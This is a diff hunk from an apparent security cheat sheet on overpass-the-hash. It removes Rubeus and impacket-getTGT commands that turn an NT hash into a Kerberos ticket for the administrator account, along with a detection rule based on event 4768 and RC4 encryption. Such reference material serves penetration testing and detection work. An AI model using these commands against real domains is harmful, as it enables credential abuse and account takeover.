@@ -21,15 +21,3 @@ Use an NT hash to request a **Kerberos TGT** (RC4/`asktgt`), then authenticate w
 
 ### Commands
 ```bash
-# ── Rubeus asktgt ────────────────────────────────────────────────────
-Rubeus.exe asktgt /user:administrator /rc4:<nt> /ptt
-
-# ── Impacket getTGT ──────────────────────────────────────────────────
-impacket-getTGT corp.local/administrator -hashes :<nt> -dc-ip 10.10.10.5
-export KRB5CCNAME=administrator.ccache
-```
-
-### Detection
-**4768 with `TicketEncryptionType=0x17`** for accounts that normally use AES.
-
----
